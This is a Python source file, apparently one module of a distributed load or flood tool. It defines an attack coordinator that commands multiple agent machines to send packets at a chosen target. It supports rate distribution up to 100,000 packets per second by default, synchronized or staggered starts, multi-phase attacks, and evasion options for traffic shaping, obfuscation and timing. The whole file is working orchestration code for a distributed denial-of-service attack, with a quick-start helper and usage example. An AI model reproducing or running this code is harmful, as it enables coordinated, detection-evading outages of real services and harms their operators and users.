"""
Attack Coordinator

High-level coordination for distributed attacks.
Provides easy-to-use interface for multi-machine testing.

Enhanced with:
- Real-time statistics streaming (Requirement 7.3)
- Load redistribution support (Requirement 7.4)
"""

import asyncio
import time
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, AsyncIterator
import logging

from .controller import DistributedController, ControllerConfig
from .protocol import AttackConfig, AgentStatus
from .stats_aggregator import StatsAggregator, AggregatedStats

logger = logging.getLogger(__name__)


@dataclass
class CoordinatedAttack:
    """Configuration for a coordinated attack"""
    name: str
    target: str
    port: int
    protocol: str
    duration: int = 60
    
    # Distribution settings
    agents_required: int = 1          # Minimum agents needed
    distribute_rate: bool = True      # Distribute rate across agents
    total_rate: int = 100000          # Total PPS across all agents
    
    # Evasion settings
    use_evasion: bool = False
    shaping_profile: str = "aggressive"
    obfuscation_method: str = "none"
    timing_pattern: str = "constant"
    
    # Coordination
    sync_start: bool = True
    stagger_start: float = 0.0        # Seconds between agent starts
    
    # Phases (for multi-phase attacks)
    phases: List[Dict[str, Any]] = field(default_factory=list)


class AttackCoordinator:
    """
    High-level coordinator for distributed attacks.
    
    Features:
    - Easy attack configuration
    - Automatic agent management
    - Multi-phase attack support
    - Real-time monitoring with streaming stats (Requirement 7.3)
    """
    
    def __init__(self, controller: Optional[DistributedController] = None):
        self.controller = controller
        self._owns_controller = False
        
        # Attack state
        self.current_attack: Optional[CoordinatedAttack] = None
        self.attack_active = False
        self.attack_start_time = 0.0
        
        # Statistics
        self.total_stats: Dict[str, Any] = {}
        self._phase_stats: List[Dict[str, Any]] = []
        
        # Real-time stats aggregator (Requirement 7.3)
        self._stats_aggregator: Optional[StatsAggregator] = None
        
    async def start_controller(self, config: Optional[ControllerConfig] = None):
        """Start a new controller if not provided"""
        if self.controller is None:
            self.controller = DistributedController(config)
            self._owns_controller = True
            await self.controller.start()
        
        # Start stats aggregator (Requirement 7.3)
        self._stats_aggregator = StatsAggregator(
            update_interval=config.stats_update_interval if config else 0.1,
            history_size=config.stats_history_size if config else 1000,
        )
        await self._stats_aggregator.start()
        
        # Register stats callback with controller
        if self.controller:
            self.controller.on_stats_update(self._on_controller_stats)
            
    async def stop_controller(self):
        """Stop the controller if we own it"""
        # Stop stats aggregator
        if self._stats_aggregator:
            await self._stats_aggregator.stop()
            self._stats_aggregator = None
        
        if self._owns_controller and self.controller:
            await self.controller.stop()
            self.controller = None
    
    def _on_controller_stats(self, stats: Dict[str, Any]):
        """Callback for controller stats updates"""
        # This is called synchronously, so we need to schedule the async update
        if self._stats_aggregator and self.controller:
            for agent in self.controller.get_agents():
                asyncio.create_task(
                    self._stats_aggregator.update_agent_stats(
                        agent.agent_id,
                        agent.current_stats,
                        active=agent.status == AgentStatus.ATTACKING
                    )
                )
            
    async def wait_for_agents(self, count: int, timeout: float = 60.0) -> bool:
        """
        Wait for specified number of agents to connect.
        
        Args:
            count: Number of agents to wait for
            timeout: Maximum wait time in seconds
            
        Returns:
            True if enough agents connected
        """
        if not self.controller:
            return False
            
        start = time.time()
        while time.time() - start < timeout:
            active = self.controller.get_active_agents()
            if len(active) >= count:
                logger.info(f"{len(active)} agents connected")
                return True
            await asyncio.sleep(1.0)
            
        logger.warning(f"Timeout waiting for agents. Have {len(self.controller.get_active_agents())}, need {count}")
        return False
        
    async def execute_attack(self, attack: CoordinatedAttack) -> Dict[str, Any]:
        """
        Execute a coordinated attack.
        
        Args:
            attack: Attack configuration
            
        Returns:
            Attack results and statistics
        """
        if not self.controller:
            raise RuntimeError("Controller not started")
            
        # Check agent count
        agents = self.controller.get_active_agents()
        if len(agents) < attack.agents_required:
            raise RuntimeError(
                f"Not enough agents. Have {len(agents)}, need {attack.agents_required}"
            )
            
        logger.info(f"Starting coordinated attack: {attack.name}")
        logger.info(f"Target: {attack.target}:{attack.port} ({attack.protocol})")
        logger.info(f"Agents: {len(agents)}")
        
        self.current_attack = attack
        self.attack_active = True
        self.attack_start_time = time.time()
        
        # Calculate per-agent rate
        if attack.distribute_rate:
            per_agent_rate = attack.total_rate // len(agents)
        else:
            per_agent_rate = attack.total_rate
            
        # Build attack config
        config = AttackConfig(
            target=attack.target,
            port=attack.port,
            protocol=attack.protocol,
            duration=attack.duration,
            rate_limit=per_agent_rate,
            use_evasion=attack.use_evasion,
            shaping_profile=attack.shaping_profile,
            obfuscation_method=attack.obfuscation_method,
            timing_pattern=attack.timing_pattern,
            sync_start=attack.sync_start,
        )
        
        # Handle staggered start
        if attack.stagger_start > 0:
            await self._staggered_start(config, agents, attack.stagger_start)
        else:
            await self.controller.start_attack(config, sync=attack.sync_start)
            
        # Wait for attack to complete
        try:
            await asyncio.sleep(attack.duration)
        except asyncio.CancelledError:
            logger.info("Attack cancelled")
            
        # Stop attack
        await self.controller.stop_attack()
        
        self.attack_active = False
        
        # Collect final stats
        self.total_stats = self.controller.get_stats()
        self.total_stats['duration'] = time.time() - self.attack_start_time
        self.total_stats['attack_name'] = attack.name
        
        logger.info(f"Attack completed: {attack.name}")
        logger.info(f"Total packets: {self.total_stats.get('packets_sent', 0)}")
        logger.info(f"Total PPS: {self.total_stats.get('pps', 0)}")
        
        return self.total_stats
        
    async def _staggered_start(self, config: AttackConfig, 
                               agents: List, stagger: float):
        """Start agents with staggered timing"""
        for i, agent in enumerate(agents):
            # Adjust start time for this agent
            agent_config = AttackConfig(
                target=config.target,
                port=config.port,
                protocol=config.protocol,
                duration=config.duration,
                rate_limit=config.rate_limit,
                use_evasion=config.use_evasion,
                shaping_profile=config.shaping_profile,
                obfuscation_method=config.obfuscation_method,
                timing_pattern=config.timing_pattern,
                sync_start=False,
                start_time=time.time() + (i * stagger),
            )
            
            msg = self.controller.msg_builder.start_attack(agent_config)
            await self.controller.send_to_agent(agent.agent_id, msg)
            
    async def execute_multi_phase(self, attack: CoordinatedAttack) -> List[Dict[str, Any]]:
        """
        Execute a multi-phase attack.
        
        Each phase can have different settings (rate, protocol, etc.)
        
        Args:
            attack: Attack with phases defined
            
        Returns:
            List of statistics for each phase
        """
        if not attack.phases:
            # Single phase
            result = await self.execute_attack(attack)
            return [result]
            
        results = []
        
        for i, phase in enumerate(attack.phases):
            logger.info(f"Starting phase {i+1}/{len(attack.phases)}")
            
            # Create phase attack config
            phase_attack = CoordinatedAttack(
                name=f"{attack.name}_phase{i+1}",
                target=attack.target,
                port=attack.port,
                protocol=phase.get('protocol', attack.protocol),
                duration=phase.get('duration', attack.duration // len(attack.phases)),
                agents_required=attack.agents_required,
                distribute_rate=attack.distribute_rate,
                total_rate=phase.get('rate', attack.total_rate),
                use_evasion=phase.get('use_evasion', attack.use_evasion),
                shaping_profile=phase.get('shaping_profile', attack.shaping_profile),
                obfuscation_method=phase.get('obfuscation_method', attack.obfuscation_method),
                timing_pattern=phase.get('timing_pattern', attack.timing_pattern),
                sync_start=attack.sync_start,
            )
            
            result = await self.execute_attack(phase_attack)
            results.append(result)
            
            # Delay between phases
            phase_delay = phase.get('delay_after', 1.0)
            if phase_delay > 0 and i < len(attack.phases) - 1:
                logger.info(f"Waiting {phase_delay}s before next phase")
                await asyncio.sleep(phase_delay)
                
        return results
        
    async def stop_attack(self):
        """Stop the current attack"""
        if self.controller and self.attack_active:
            await self.controller.stop_attack()
            self.attack_active = False
            
    def get_live_stats(self) -> Dict[str, Any]:
        """Get live statistics during attack"""
        if not self.controller:
            return {}
            
        stats = self.controller.get_stats()
        
        if self.attack_active:
            stats['elapsed'] = time.time() - self.attack_start_time
            if self.current_attack:
                stats['remaining'] = max(0, self.current_attack.duration - stats['elapsed'])
                stats['progress'] = min(100, (stats['elapsed'] / self.current_attack.duration) * 100)
                
        return stats
    
    # Real-time stats streaming (Requirement 7.3)
    
    async def stream_stats(self) -> AsyncIterator[AggregatedStats]:
        """
        Stream real-time aggregated statistics.
        
        Usage:
            async for stats in coordinator.stream_stats():
                print(f"PPS: {stats.total_pps}, Agents: {stats.active_agents}")
        """
        if not self._stats_aggregator:
            return
        
        async for stats in self._stats_aggregator.stream():
            # Add attack progress info
            if self.attack_active and self.current_attack:
                elapsed = time.time() - self.attack_start_time
                # Note: AggregatedStats doesn't have these fields, 
                # but we yield the stats object as-is
            yield stats
    
    async def get_stats_history(self, count: int = 100) -> List[AggregatedStats]:
        """Get historical aggregated statistics"""
        if not self._stats_aggregator:
            return []
        return await self._stats_aggregator.get_history(count)
    
    def get_prometheus_metrics(self) -> str:
        """Get current stats in Prometheus format"""
        if self._stats_aggregator:
            return self._stats_aggregator.get_prometheus_metrics()
        return ""
    
    def get_json_metrics(self) -> str:
        """Get current stats in JSON format"""
        if self._stats_aggregator:
            return self._stats_aggregator.get_json_metrics()
        return "{}"
    
    def get_aggregated_stats(self) -> Optional[AggregatedStats]:
        """Get current aggregated stats object"""
        if self._stats_aggregator:
            return self._stats_aggregator.get_current()
        return None


# Convenience functions for quick setup

async def quick_distributed_attack(
    target: str,
    port: int,
    protocol: str = "UDP",
    duration: int = 60,
    controller_port: int = 9999,
    wait_for_agents: int = 1,
    agent_timeout: float = 60.0,
) -> Dict[str, Any]:
    """
    Quick setup for a distributed attack.
    
    Usage:
        # On controller machine:
        result = await quick_distributed_attack("192.168.1.100", 80, "HTTP", 60)
        
        # On agent machines (run separately):
        # python -m core.distributed.agent --controller <controller_ip>
    """
    coordinator = AttackCoordinator()
    
    try:
        # Start controller
        await coordinator.start_controller(ControllerConfig(bind_port=controller_port))
        
        # Wait for agents
        print(f"Waiting for {wait_for_agents} agent(s) to connect...")
        print(f"Agents should connect to port {controller_port}")
        
        if not await coordinator.wait_for_agents(wait_for_agents, agent_timeout):
            raise RuntimeError("Not enough agents connected")
            
        # Execute attack
        attack = CoordinatedAttack(
            name="quick_attack",
            target=target,
            port=port,
            protocol=protocol,
            duration=duration,
            agents_required=wait_for_agents,
        )
        
        return await coordinator.execute_attack(attack)
        
    finally:
        await coordinator.stop_controller()
